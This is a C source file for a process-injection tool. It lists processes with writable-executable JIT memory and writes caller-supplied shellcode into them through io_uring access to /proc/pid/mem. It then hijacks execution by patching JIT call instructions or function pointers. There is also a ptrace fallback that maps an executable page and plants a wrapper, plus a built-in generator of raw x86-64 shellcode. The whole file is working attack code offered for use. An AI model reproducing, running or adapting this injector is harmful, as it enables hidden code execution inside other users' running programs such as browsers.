#define _GNU_SOURCE
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>

#include "iouring_utils.h"

#define MAX_MAPS       512
#define HEAP_SCAN_CAP  (32 * 1024 * 1024)
#define TOTAL_SCAN_CAP (256 * 1024 * 1024)
#define FPTR_MAX       2048
#define PATCH_MAX      64
#define PATCH_SCAN     (2 * 1024 * 1024)

struct map_entry {
    uint64_t start, end;
    char perms[8];
    char label[256];
};

static struct map_entry g_maps[MAX_MAPS];
static int              g_nmap = 0;

static int parse_maps(pid_t pid)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f) return -1;

    char line[512];
    g_nmap = 0;
    while (g_nmap < MAX_MAPS && fgets(line, sizeof(line), f)) {
        struct map_entry *e = &g_maps[g_nmap];
        uint64_t off; unsigned dmaj, dmin; uint64_t inode;
        char label[256] = "";
        int r = sscanf(line, "%lx-%lx %7s %lx %x:%x %lu %255[^\n]",
                       &e->start, &e->end, e->perms,
                       &off, &dmaj, &dmin, &inode, label);
        if (r < 4) continue;
        char *p = label; while (*p == ' ') p++;
        snprintf(e->label, sizeof(e->label), "%s", p);
        g_nmap++;
    }
    fclose(f);
    return g_nmap;
}

static int is_rwx(struct map_entry *e)
{
    return e->perms[0]=='r' && e->perms[1]=='w' && e->perms[2]=='x';
}

static int is_writable(struct map_entry *e)
{
    return e->perms[1] == 'w';
}

static int exec_map_idx(uint64_t addr)
{
    for (int i = 0; i < g_nmap; i++) {
        struct map_entry *e = &g_maps[i];
        if (addr >= e->start && addr < e->end && strchr(e->perms, 'x'))
            return i;
    }
    return -1;
}

static int first_rwx_idx(void)
{
    for (int i = 0; i < g_nmap; i++)
        if (is_rwx(&g_maps[i])) return i;
    return -1;
}

static void read_comm(pid_t pid, char *buf, size_t len)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    FILE *f = fopen(path, "r");
    if (!f) { snprintf(buf, len, "?"); return; }
    if (!fgets(buf, (int)len, f)) snprintf(buf, len, "?");
    fclose(f);
    buf[strcspn(buf, "\n")] = '\0';
}

static void read_cmdline(pid_t pid, char *buf, size_t len)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
    FILE *f = fopen(path, "r");
    if (!f) { buf[0] = '\0'; return; }
    size_t n = fread(buf, 1, len - 1, f);
    fclose(f);
    buf[n] = '\0';

    for (size_t i = 0; i < n; i++)
        if (buf[i] == '\0') buf[i] = ' ';

    while (n > 0 && buf[n-1] == ' ') buf[--n] = '\0';
}

static int mem_open_rw(pid_t pid, struct uring *u)
{
    static char path[64];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    sqe->opcode     = IORING_OP_OPENAT;
    sqe->fd         = AT_FDCWD;
    sqe->addr       = (uint64_t)(uintptr_t)path;
    sqe->open_flags = O_RDWR;
    sqe->user_data  = 10;
    uring_submit_wait(u, 1);
    struct io_uring_cqe cqe;
    uring_peek_cqe(u, &cqe);
    return cqe.res;
}

static int mem_write_at(struct uring *u, int fd,
                         uint64_t addr, const void *data, size_t len)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    sqe->opcode    = IORING_OP_WRITE;
    sqe->fd        = fd;
    sqe->addr      = (uint64_t)(uintptr_t)data;
    sqe->len       = (uint32_t)len;
    sqe->off       = addr;
    sqe->user_data = 11;
    uring_submit_wait(u, 1);
    struct io_uring_cqe cqe;
    uring_peek_cqe(u, &cqe);
    return cqe.res;
}

static void mem_close_fd(struct uring *u, int fd)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    sqe->opcode    = IORING_OP_CLOSE;
    sqe->fd        = fd;
    sqe->user_data = 12;
    uring_submit_wait(u, 1);
    struct io_uring_cqe cqe;
    uring_peek_cqe(u, &cqe);
}

static int mem_read_at(struct uring *u, int fd,
                        uint64_t addr, void *data, size_t len)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    sqe->opcode    = IORING_OP_READ;
    sqe->fd        = fd;
    sqe->addr      = (uint64_t)(uintptr_t)data;
    sqe->len       = (uint32_t)len;
    sqe->off       = addr;
    sqe->user_data = 13;
    uring_submit_wait(u, 1);
    struct io_uring_cqe cqe;
    uring_peek_cqe(u, &cqe);
    return cqe.res;
}

static int uring_open_ro(struct uring *u, const char *path)
{
    static char _path[256];
    snprintf(_path, sizeof(_path), "%s", path);
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    sqe->opcode     = IORING_OP_OPENAT;
    sqe->fd         = AT_FDCWD;
    sqe->addr       = (uint64_t)(uintptr_t)_path;
    sqe->open_flags = O_RDONLY;
    sqe->user_data  = 14;
    uring_submit_wait(u, 1);
    struct io_uring_cqe cqe;
    uring_peek_cqe(u, &cqe);
    return cqe.res;
}

static int uring_read_fd(struct uring *u, int fd, void *buf, size_t len)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    sqe->opcode    = IORING_OP_READ;
    sqe->fd        = fd;
    sqe->addr      = (uint64_t)(uintptr_t)buf;
    sqe->len       = (uint32_t)len;
    sqe->off       = 0;
    sqe->user_data = 15;
    uring_submit_wait(u, 1);
    struct io_uring_cqe cqe;
    uring_peek_cqe(u, &cqe);
    return cqe.res;
}

struct fptr {
    uint64_t at;
    uint64_t val;
    int      rwx;
};

static int scan_for_fptrs(pid_t pid, struct fptr *out, int max,
                           uint64_t target_start, uint64_t target_end)
{
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);
    int memfd = open(mem_path, O_RDONLY);
    if (memfd < 0) return 0;

    int     found      = 0;
    size_t  total_read = 0;

    for (int i = 0; i < g_nmap && found < max; i++) {
        struct map_entry *e = &g_maps[i];
        if (!is_writable(e)) continue;
        if (strstr(e->label, "vdso") || strstr(e->label, "vvar")) continue;
        if (total_read >= TOTAL_SCAN_CAP) break;

        uint64_t sz = e->end - e->start;
        if (sz > HEAP_SCAN_CAP) sz = HEAP_SCAN_CAP;
        if (total_read + sz > TOTAL_SCAN_CAP) sz = TOTAL_SCAN_CAP - total_read;

        uint8_t *buf = malloc(sz);
        if (!buf) continue;

        ssize_t r = pread(memfd, buf, sz, (off_t)e->start);
        if (r > 0) {
            total_read += (size_t)r;
            for (ssize_t off = 0; off + 8 <= r && found < max; off += 8) {
                uint64_t val;
                memcpy(&val, buf + off, 8);

                if (target_start && (val < target_start || val >= target_end)) continue;

                int xi = exec_map_idx(val);
                if (xi >= 0) {
                    out[found].at  = e->start + (uint64_t)off;
                    out[found].val = val;
                    out[found].rwx = is_rwx(&g_maps[xi]);
                    found++;
                }
            }
        }
        free(buf);
    }
    close(memfd);
    return found;
}

static int parse_hex(const char *s, uint8_t *out, size_t maxlen)
{
    size_t slen = strlen(s);
    if (slen % 2 || slen / 2 > maxlen) return -1;
    for (size_t i = 0; i < slen / 2; i++) {
        char b[3] = { s[i*2], s[i*2+1], 0 };
        out[i] = (uint8_t)strtoul(b, NULL, 16);
    }
    return (int)(slen / 2);
}

static void do_list_all(void)
{
    DIR *proc = opendir("/proc");
    if (!proc) { perror("/proc"); return; }

    printf("%-8s %-7s %-20s %-34s %s\n",
           "PID", "METHOD", "NAME", "RWX REGION", "CMDLINE");
    printf("%s\n",
           "----------------------------------------------------------------------------------------");

    struct dirent *de;
    int jit_cnt = 0, ptrace_cnt = 0;

    pid_t pids[4096]; int npids = 0;
    while ((de = readdir(proc)) && npids < 4096) {
        if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        pids[npids++] = (pid_t)atoi(de->d_name);
    }
    closedir(proc);

    for (int p = 0; p < npids; p++) {
        pid_t pid = pids[p];
        if (parse_maps(pid) < 0) continue;
        int xi = first_rwx_idx();
        if (xi < 0) continue;

        char comm[64], cmdline[128];
        read_comm(pid, comm, sizeof(comm));
        read_cmdline(pid, cmdline, sizeof(cmdline));
        if (strlen(cmdline) > 55) { cmdline[52]='.'; cmdline[53]='.'; cmdline[54]='.'; cmdline[55]='\0'; }

        printf("%-8d %-7s %-20s %016lx-%016lx  %s\n",
               pid, "JIT", comm, g_maps[xi].start, g_maps[xi].end, cmdline);
        jit_cnt++;
    }

    if (jit_cnt > 0) printf("\n");
    for (int p = 0; p < npids; p++) {
        pid_t pid = pids[p];
        if (parse_maps(pid) < 0) continue;
        if (first_rwx_idx() >= 0) continue;

        char comm[64], cmdline[128];
        read_comm(pid, comm, sizeof(comm));
        read_cmdline(pid, cmdline, sizeof(cmdline));
        if (cmdline[0] == '\0') continue;
        if (strlen(cmdline) > 55) { cmdline[52]='.'; cmdline[53]='.'; cmdline[54]='.'; cmdline[55]='\0'; }

        printf("%-8d %-7s %-20s %-34s %s\n",
               pid, "ptrace", comm, "(no rwx - ptrace mmap)", cmdline);
        ptrace_cnt++;
    }

    printf("\n[*] %d JIT-injectable   %d ptrace-injectable\n", jit_cnt, ptrace_cnt);
    printf("\nJIT    (fires on next JS exec):  sudo ./io_uring/proc_inject          <pid> <sc_hex>\n");
    printf("ptrace (fires immediately):      sudo ./io_uring/proc_inject --ptrace <pid> <sc_hex>\n");
}

static void do_scan(pid_t pid)
{
    if (parse_maps(pid) < 0) { perror("parse_maps"); return; }

    char comm[64];
    read_comm(pid, comm, sizeof(comm));
    printf("[*] pid %d (%s) - memory regions\n\n", pid, comm);
    printf("  %-36s %-5s %s\n", "range", "perm", "label");
    printf("  %s\n", "----------------------------------------------------------------------");

    for (int i = 0; i < g_nmap; i++) {
        struct map_entry *e = &g_maps[i];
        const char *tag = "";
        if (strncmp(e->perms, "rwx", 3) == 0) tag = "  [rwx]";
        else if (strncmp(e->perms, "rw-", 3) == 0) tag = "  [rw]";

        printf("  %016lx-%016lx %s  %s%s\n",
               e->start, e->end, e->perms,
               e->label[0] ? e->label : "(anon)", tag);
    }

    struct fptr ptrs[FPTR_MAX];
    int n = scan_for_fptrs(pid, ptrs, FPTR_MAX, 0, 0);

    printf("\n[*] code pointers in writable regions (%d found):\n\n", n);
    if (n > 0) {
        printf("  %-20s  %-18s  %-5s  %s\n", "pointer_at", "current_value", "rwx?", "exec region");
        printf("  %s\n", "-------------------------------------------------------------------");
        int show = n > 16 ? 16 : n;
        for (int i = 0; i < show; i++) {
            int xi = exec_map_idx(ptrs[i].val);
            printf("  0x%016lx  0x%016lx  %-5s  %s\n",
                   ptrs[i].at, ptrs[i].val,
                   ptrs[i].rwx ? "YES" : "no",
                   xi >= 0 && g_maps[xi].label[0] ? g_maps[xi].label : "(exec anon)");
        }
        if (n > 16) printf("  ... (%d more)\n", n - 16);
    }

    int xi = first_rwx_idx();
    if (xi >= 0) {
        printf("\n[+] injection methods available:\n");
        printf("    JIT    (fires on next JS execution):\n");
        printf("           sudo ./io_uring/proc_inject          %d <shellcode_hex>\n", pid);
        printf("    ptrace (fires immediately, process survives):\n");
        printf("           sudo ./io_uring/proc_inject --ptrace %d <shellcode_hex>\n", pid);
    } else {
        printf("\n[+] injection method:\n");
        printf("    ptrace (fires immediately, process survives):\n");
        printf("           sudo ./io_uring/proc_inject --ptrace %d <shellcode_hex>\n", pid);
        printf("    (no rwx pages - JIT injection not available)\n");
    }
}

static uint64_t find_syscall_gadget(pid_t pid, int memfd, struct uring *u)
{

    char maps_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    int maps_fd = uring_open_ro(u, maps_path);
    if (maps_fd < 0) return 0;

    const size_t maps_sz = 256 * 1024;
    char *maps_buf = malloc(maps_sz);
    if (!maps_buf) { mem_close_fd(u, maps_fd); return 0; }

    int maps_len = uring_read_fd(u, maps_fd, maps_buf, maps_sz - 1);
    mem_close_fd(u, maps_fd);

    if (maps_len <= 0) { free(maps_buf); return 0; }
    maps_buf[maps_len] = '\0';

    uint64_t result = 0;
    int found_vdso = 0;

    char *line = maps_buf;
    while (*line && !found_vdso) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = '\0';

        uint64_t start, end;
        char perms[8], name[256]; name[0] = '\0';
        int r = sscanf(line, "%lx-%lx %7s %*s %*s %*s %255[^\n]",
                       &start, &end, perms, name);

        if (nl) { *nl = '\n'; line = nl + 1; } else { line += strlen(line); }
        if (r < 3 || perms[2] != 'x') continue;

        int is_vdso = (strstr(name, "[vdso]") != NULL);
        size_t sz = (size_t)(end - start);
        if (sz > 65536) sz = 65536;

        uint8_t *buf = malloc(sz);
        if (!buf) continue;

        int nr = mem_read_at(u, memfd, start, buf, sz);
        for (int i = 0; i + 1 < nr; i++) {
            if (buf[i] == 0x0f && buf[i+1] == 0x05) {
                result = start + (uint64_t)i;
                if (is_vdso) found_vdso = 1;
                break;
            }
        }
        free(buf);
    }
    free(maps_buf);
    return result;
}

static void do_inject_ptrace(pid_t pid, uint8_t *sc, int sc_len)
{
    char comm[64];
    read_comm(pid, comm, sizeof(comm));
    printf("[*] target: pid=%d (%s) - ptrace mode (no rwx pages)\n\n", pid, comm);

    struct uring u = {};
    if (uring_init(&u, 16) < 0) { perror("[!] uring_init"); return; }

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("[!] ptrace attach"); uring_free(&u); return;
    }
    int wst;
    waitpid(pid, &wst, 0);
    if (!WIFSTOPPED(wst)) {
        fprintf(stderr, "[!] process did not stop after attach\n");
        ptrace(PTRACE_DETACH, pid, NULL, NULL); uring_free(&u); return;
    }
    printf("[1] attached - process stopped (signal %d)\n", WSTOPSIG(wst));

    int memfd = mem_open_rw(pid, &u);
    if (memfd < 0) {
        fprintf(stderr, "[!] io_uring open /proc/%d/mem: %s\n", pid, strerror(-memfd));
        ptrace(PTRACE_DETACH, pid, NULL, NULL); uring_free(&u); return;
    }

    uint64_t gadget = find_syscall_gadget(pid, memfd, &u);
    if (!gadget) {
        fprintf(stderr, "[!] no syscall (0f 05) gadget found in target\n");
        mem_close_fd(&u, memfd); ptrace(PTRACE_DETACH, pid, NULL, NULL);
        uring_free(&u); return;
    }
    printf("[2] syscall gadget at 0x%lx (found via io_uring)\n", gadget);

    struct user_regs_struct orig, regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &orig) < 0) {
        perror("[!] PTRACE_GETREGS");
        mem_close_fd(&u, memfd); ptrace(PTRACE_DETACH, pid, NULL, NULL);
        uring_free(&u); return;
    }

    memcpy(&regs, &orig, sizeof(regs));
    regs.rax = 9;
    regs.rdi = 0;
    regs.rsi = 4096;
    regs.rdx = 7;
    regs.r10 = 0x22;
    regs.r8  = (uint64_t)-1;
    regs.r9  = 0;
    regs.rip = gadget;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
    ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

    uint64_t rwx_addr = regs.rax;
    if ((int64_t)rwx_addr < 0 || rwx_addr > 0x7fffffffffffULL) {
        fprintf(stderr, "[!] mmap in target failed (rax=0x%lx)\n", rwx_addr);
        ptrace(PTRACE_SETREGS, pid, NULL, &orig);
        mem_close_fd(&u, memfd); ptrace(PTRACE_DETACH, pid, NULL, NULL);
        uring_free(&u); return;
    }
    printf("[3] mmap'd rwx page at 0x%lx inside target\n", rwx_addr);

    uint64_t saved_rip = orig.rip;

    static const uint8_t reg_enc[9][2] = {
        {0x48, 0x05},
        {0x48, 0x0D},
        {0x48, 0x15},
        {0x48, 0x35},
        {0x48, 0x3D},
        {0x4C, 0x05},
        {0x4C, 0x0D},
        {0x4C, 0x15},
        {0x4C, 0x1D},
    };

#define WR_SC_OFF 151
    int total = WR_SC_OFF + sc_len + 80;
    uint8_t *combined = calloc(1, (size_t)total);
    if (!combined) { perror("[!] calloc"); ptrace(PTRACE_SETREGS, pid, NULL, &orig);
        mem_close_fd(&u, memfd); ptrace(PTRACE_DETACH, pid, NULL, NULL);
        uring_free(&u); return; }

    uint64_t save_area = rwx_addr + WR_SC_OFF + sc_len;
    uint64_t slots[10];
    for (int i = 0; i < 10; i++) slots[i] = save_area + (uint64_t)(i * 8);

    int n = 0;

    for (int i = 0; i < 9; i++) {
        combined[n++] = reg_enc[i][0];
        combined[n++] = 0x89;
        combined[n++] = reg_enc[i][1];
        int32_t d = (int32_t)(slots[i] - (rwx_addr + (uint64_t)(n + 4)));
        memcpy(combined + n, &d, 4); n += 4;
    }

    combined[n++] = 0x48; combined[n++] = 0x81;
    combined[n++] = 0xEC; combined[n++] = 0x80; combined[n++] = 0x00;
    combined[n++] = 0x00; combined[n++] = 0x00;

    combined[n++] = 0xE8;
    { int32_t rel = (int32_t)(WR_SC_OFF - (n + 4));
      memcpy(combined + n, &rel, 4); n += 4; }

    for (int i = 0; i < 9; i++) {
        combined[n++] = reg_enc[i][0];
        combined[n++] = 0x8B;
        combined[n++] = reg_enc[i][1];
        int32_t d = (int32_t)(slots[i] - (rwx_addr + (uint64_t)(n + 4)));
        memcpy(combined + n, &d, 4); n += 4;
    }

    combined[n++] = 0x48; combined[n++] = 0x81;
    combined[n++] = 0xC4; combined[n++] = 0x80; combined[n++] = 0x00;
    combined[n++] = 0x00; combined[n++] = 0x00;

    combined[n++] = 0xFF; combined[n++] = 0x25;
    { int32_t d = (int32_t)(slots[9] - (rwx_addr + (uint64_t)(n + 4)));
      memcpy(combined + n, &d, 4); n += 4; }

    if (n != WR_SC_OFF) {
        fprintf(stderr, "[!] wrapper build error: n=%d expected %d\n", n, WR_SC_OFF);
        free(combined); ptrace(PTRACE_SETREGS, pid, NULL, &orig);
        mem_close_fd(&u, memfd); ptrace(PTRACE_DETACH, pid, NULL, NULL);
        uring_free(&u); return;
    }

    memcpy(combined + WR_SC_OFF, sc, (size_t)sc_len);

    uint64_t rax_to_restore = (uint64_t)orig.rax;
    if ((int64_t)orig.rax < 0) {
        uint8_t prev2[2] = {0, 0};
        mem_read_at(&u, memfd, saved_rip - 2, prev2, 2);
        if (prev2[0] == 0x0f && prev2[1] == 0x05) {

            rax_to_restore = (uint64_t)(int64_t)(-4);
        }
    }

    for (int k = 0; k < 7; k++) combined[k] = 0x90;
    memcpy(combined + WR_SC_OFF + sc_len + 0,  &rax_to_restore, 8);
    memcpy(combined + WR_SC_OFF + sc_len + 72, &saved_rip,      8);

    int wr = mem_write_at(&u, memfd, rwx_addr, combined, (size_t)total);
    free(combined);
    if (wr < total) {
        fprintf(stderr, "[!] io_uring write failed: %d\n", wr);
        ptrace(PTRACE_SETREGS, pid, NULL, &orig);
        mem_close_fd(&u, memfd); ptrace(PTRACE_DETACH, pid, NULL, NULL);
        uring_free(&u); return;
    }
    printf("[4] planted wrapper+shellcode (%d bytes) at 0x%lx (via io_uring)\n",
           total, rwx_addr);

    mem_close_fd(&u, memfd);
    uring_free(&u);

    orig.rip      = rwx_addr;
    orig.orig_rax = (unsigned long long)-1;
    ptrace(PTRACE_SETREGS, pid, NULL, &orig);

    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    printf("[5] detached - wrapper → shellcode → resume at 0x%llx\n",
           (unsigned long long)saved_rip);
    printf("[+] injection complete\n");
}

static void do_inject(pid_t pid, uint8_t *sc, int sc_len)
{
    if (parse_maps(pid) < 0) { perror("parse_maps"); return; }

    char comm[64];
    read_comm(pid, comm, sizeof(comm));
    printf("[*] target: pid=%d (%s)  shellcode=%d bytes\n\n", pid, comm, sc_len);

    int xi = first_rwx_idx();
    if (xi < 0) {
        printf("[!] no rwx pages in pid %d (%s)\n\n", pid, comm);
        printf("[*] falling back to ptrace injection (works on any process)\n\n");
        do_inject_ptrace(pid, sc, sc_len);
        return;
    }

    uint64_t sc_addr = g_maps[xi].start;
    printf("[1] rwx region: %016lx-%016lx  (%s)\n",
           g_maps[xi].start, g_maps[xi].end,
           g_maps[xi].label[0] ? g_maps[xi].label : "anon");
    printf("[1] shellcode lands at: 0x%lx\n\n", sc_addr);

    struct uring u = {};
    if (uring_init(&u, 8) < 0) { perror("uring_init"); return; }

    int memfd = mem_open_rw(pid, &u);
    if (memfd < 0) {
        fprintf(stderr, "[!] open /proc/%d/mem: %s\n", pid, strerror(-memfd));
        uring_free(&u);
        return;
    }

    int r = mem_write_at(&u, memfd, sc_addr, sc, (size_t)sc_len);
    if (r < 0) {
        fprintf(stderr, "[!] write shellcode: %s\n", strerror(-r));
        mem_close_fd(&u, memfd);
        uring_free(&u);
        return;
    }
    printf("[2] planted %d bytes at 0x%lx\n\n", r, sc_addr);

    uint64_t rwx_end = g_maps[xi].end;

    printf("[3] reading JIT region and scanning for patchable call/jmp...\n");

    uint64_t scan_base;
    {
        const uint64_t probe_sz = 2 * 1024 * 1024;
        uint8_t *probe = malloc(probe_sz);
        uint64_t frontier = sc_addr + (uint64_t)sc_len;

        if (probe) {

            uint64_t checked = 0;
            for (uint64_t a = rwx_end; a > sc_addr + (uint64_t)sc_len + probe_sz;
                 a -= probe_sz) {
                ssize_t r = pread(memfd, probe, probe_sz, (off_t)(a - probe_sz));
                if (r > 0) {
                    int nz = 0;
                    for (ssize_t i = 0; i < r && !nz; i++) nz = (probe[i] != 0);
                    if (nz) { frontier = a; break; }
                }
                checked += probe_sz;
                if (checked > 512ULL * 1024 * 1024) break;
            }
            free(probe);
        }

        scan_base = (frontier > (uint64_t)PATCH_SCAN + sc_addr + sc_len)
                    ? frontier - (uint64_t)PATCH_SCAN
                    : sc_addr + (uint64_t)sc_len;

        printf("[3] JIT frontier ~0x%lx - scanning 0x%lx → 0x%lx\n",
               frontier, scan_base, frontier);
    }

    int patched = 0;
    {
        if (scan_base < rwx_end) {
            size_t avail = (size_t)(rwx_end - scan_base);
            if (avail > PATCH_SCAN) avail = PATCH_SCAN;

            uint8_t *buf = malloc(avail);
            if (buf) {
                ssize_t nr = pread(memfd, buf, avail, (off_t)scan_base);

                for (ssize_t i = 0; i + 5 <= nr && patched < PATCH_MAX; i++) {
                    uint8_t opc = buf[i];
                    if (opc != 0xE8) continue;

                    uint64_t iaddr = scan_base + (uint64_t)i;
                    int32_t  old_rel;
                    memcpy(&old_rel, buf + i + 1, 4);
                    uint64_t old_tgt = iaddr + 5 +
                                       (uint64_t)(int64_t)old_rel;

                    if (exec_map_idx(old_tgt) < 0) continue;

                    int64_t new64 = (int64_t)sc_addr - (int64_t)(iaddr + 5);
                    if (new64 < -0x7fffffffLL || new64 > 0x7fffffffLL) continue;
                    int32_t new_rel = (int32_t)new64;

                    if (pwrite(memfd, &new_rel, 4, (off_t)(iaddr + 1)) == 4) {
                        if (patched < 8)
                            printf("    [%d] call @ 0x%lx  →  shellcode "
                                   "(was 0x%lx)\n",
                                   patched, iaddr, old_tgt);
                        patched++;
                        i += 4;
                    }
                }
                if (patched > 8)
                    printf("    ... (%d more)\n", patched - 8);
                free(buf);
            }
        }
    }

    int redirected = 0;
    if (patched == 0) {
        printf("[3] no patchable JIT instructions found - trying data pointer blast...\n");

        struct fptr jit_ptrs[FPTR_MAX];
        int njit = scan_for_fptrs(pid, jit_ptrs, FPTR_MAX, sc_addr, rwx_end);

        for (int i = 0; i < njit; i++) {
            if (mem_write_at(&u, memfd, jit_ptrs[i].at, &sc_addr, 8) > 0)
                redirected++;
        }

        if (redirected == 0) {

            struct fptr any[FPTR_MAX];
            int nany = scan_for_fptrs(pid, any, FPTR_MAX, 0, 0);
            int best  = -1;
            for (int i = 0; i < nany; i++) {
                if (any[i].rwx) { best = i; break; }
            }
            if (best < 0 && nany > 0) best = 0;
            if (best >= 0 &&
                mem_write_at(&u, memfd, any[best].at, &sc_addr, 8) > 0)
                redirected = 1;
        }
    }

    mem_close_fd(&u, memfd);
    uring_free(&u);

    printf("\n");
    if (patched == 0 && redirected == 0) {
        fprintf(stderr, "[!] could not redirect execution\n");
        fprintf(stderr, "[*] shellcode planted at 0x%lx - needs manual trigger\n",
                sc_addr);
        return;
    }

    if (patched > 0) {
        printf("[+] patched %d JIT call/jmp instruction(s) → 0x%lx\n",
               patched, sc_addr);
        printf("[*] fires automatically on next JS execution in pid %d\n", pid);
        printf("[*] no manual trigger needed - extensions/timers run constantly\n");
    } else {
        printf("[+] redirected %d data pointer(s) → 0x%lx\n",
               redirected, sc_addr);
        printf("[*] trigger: interact with the process\n");
    }
    printf("[*] monitor: watch -n0.2 'cat /tmp/pwned 2>/dev/null'\n");
    printf("[*] for non-destructive injection, generate write-and-ret shellcode:\n");
    printf("    sudo ./io_uring/proc_inject gen-sc /tmp/pwned 70776e65640a\n");
}

static void do_gen_sc(const char *path, const char *data_hex)
{
    uint8_t data[256];
    int dlen = parse_hex(data_hex, data, sizeof(data));
    if (dlen < 0) { fprintf(stderr, "[!] bad data hex\n"); return; }

    size_t plen = strlen(path) + 1;

    int32_t x = (int32_t)(84 - 17);
    int32_t y = (int32_t)(84 + (int)plen - 51);

    uint8_t sc[512];
    int n = 0;

    sc[n++]=0x55;
    sc[n++]=0x41; sc[n++]=0x54;
    sc[n++]=0x41; sc[n++]=0x55;
    sc[n++]=0x41; sc[n++]=0x56;
    sc[n++]=0x41; sc[n++]=0x57;
    sc[n++]=0x53;
    sc[n++]=0x48; sc[n++]=0x8d; sc[n++]=0x3d;
    memcpy(sc+n,&x,4); n+=4;
    sc[n++]=0xbe; sc[n++]=0x41; sc[n++]=0x02; sc[n++]=0x00; sc[n++]=0x00;
    sc[n++]=0xba; sc[n++]=0xa4; sc[n++]=0x01; sc[n++]=0x00; sc[n++]=0x00;
    sc[n++]=0xb8; sc[n++]=0x02; sc[n++]=0x00; sc[n++]=0x00; sc[n++]=0x00;
    sc[n++]=0x0f; sc[n++]=0x05;
    sc[n++]=0x85; sc[n++]=0xc0;
    sc[n++]=0x78; sc[n++]=0x23;
    sc[n++]=0x41; sc[n++]=0x89; sc[n++]=0xc4;
    sc[n++]=0x44; sc[n++]=0x89; sc[n++]=0xe7;
    sc[n++]=0x48; sc[n++]=0x8d; sc[n++]=0x35;
    memcpy(sc+n,&y,4); n+=4;
    sc[n++]=0xba;
    uint32_t dl32 = (uint32_t)dlen;
    memcpy(sc+n,&dl32,4); n+=4;
    sc[n++]=0xb8; sc[n++]=0x01; sc[n++]=0x00; sc[n++]=0x00; sc[n++]=0x00;
    sc[n++]=0x0f; sc[n++]=0x05;
    sc[n++]=0x44; sc[n++]=0x89; sc[n++]=0xe7;
    sc[n++]=0xb8; sc[n++]=0x03; sc[n++]=0x00; sc[n++]=0x00; sc[n++]=0x00;
    sc[n++]=0x0f; sc[n++]=0x05;
    sc[n++]=0x5b;
    sc[n++]=0x41; sc[n++]=0x5f;
    sc[n++]=0x41; sc[n++]=0x5e;
    sc[n++]=0x41; sc[n++]=0x5d;
    sc[n++]=0x41; sc[n++]=0x5c;
    sc[n++]=0x5d;
    sc[n++]=0xc3;

    memcpy(sc+n, path, plen); n += (int)plen;
    memcpy(sc+n, data, dlen); n += dlen;

    printf("[*] write-and-ret shellcode: %d bytes\n", n);
    printf("[*] writes %d bytes to %s and returns cleanly\n", dlen, path);
    printf("[*] safe for JIT call patching - no fork, no exec\n\n");

    for (int i = 0; i < n; i++) printf("%02x", sc[i]);
    printf("\n\n");

    printf("usage:\n");
    printf("  sudo ./io_uring/proc_inject <pid> ");
    for (int i = 0; i < n; i++) printf("%02x", sc[i]);
    printf("\n");
}

int main(int argc, char *argv[])
{
    if (argc == 1) {
        do_list_all();
        return 0;
    }

    if (argc >= 4 && strcmp(argv[1], "gen-sc") == 0) {
        do_gen_sc(argv[2], argv[3]);
        return 0;
    }

    if (argc == 2) {
        do_scan((pid_t)atoi(argv[1]));
        return 0;
    }

    int force_ptrace = 0;
    int arg_off = 1;
    if (argc >= 4 && strcmp(argv[1], "--ptrace") == 0) {
        force_ptrace = 1;
        arg_off = 2;
    }

    pid_t   pid = (pid_t)atoi(argv[arg_off]);
    uint8_t sc[4096];
    int sc_len = parse_hex(argv[arg_off + 1], sc, sizeof(sc));
    if (sc_len < 0) {
        fprintf(stderr, "[!] invalid shellcode hex\n"
                        "[*] generate a safe shellcode with:\n"
                        "    %s gen-sc <path> <content_hex>\n"
                        "    example: %s gen-sc /tmp/pwned 70776e65640a\n",
                argv[0], argv[0]);
        return 1;
    }

    if (force_ptrace) {
        if (parse_maps(pid) < 0) { perror("parse_maps"); return 1; }
        char comm[64]; read_comm(pid, comm, sizeof(comm));
        printf("[*] target: pid=%d (%s)  shellcode=%d bytes (--ptrace forced)\n\n",
               pid, comm, sc_len);
        do_inject_ptrace(pid, sc, sc_len);
    } else {
        do_inject(pid, sc, sc_len);
    }
    return 0;
}
